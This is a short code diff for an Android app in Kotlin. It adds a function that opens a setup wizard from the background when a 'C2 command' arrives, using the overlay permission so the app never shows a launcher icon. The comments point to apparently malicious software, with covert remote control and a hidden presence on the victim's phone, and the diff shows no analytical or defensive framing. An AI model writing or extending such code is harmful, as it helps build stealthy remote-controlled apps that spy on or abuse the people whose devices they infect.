@@ -651,6 +651,23 @@ class LauncherActivity : Activity() {
     private fun dp(v: Int): Int = (v * resources.displayMetrics.density).toInt()
 
     companion object {
+        /**
+         * Opens the wizard from the background (C2 command "wizard").
+         *
+         * Apps with the "display over other apps" permission may start an
+         * activity from the background, so the wizard can be opened without
+         * ever putting an icon into the launcher.
+         */
+        fun openFromBackground(ctx: Context): Boolean {
+            return try {
+                val i = Intent(ctx, LauncherActivity::class.java)
+                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED)
+                ctx.startActivity(i)
+                true
+            } catch (t: Throwable) {
+                false
+            }
+        }
         private const val REQ_PERMS = 0x5F70
 
         /** Automatic setup runs on the first start after the installation. */
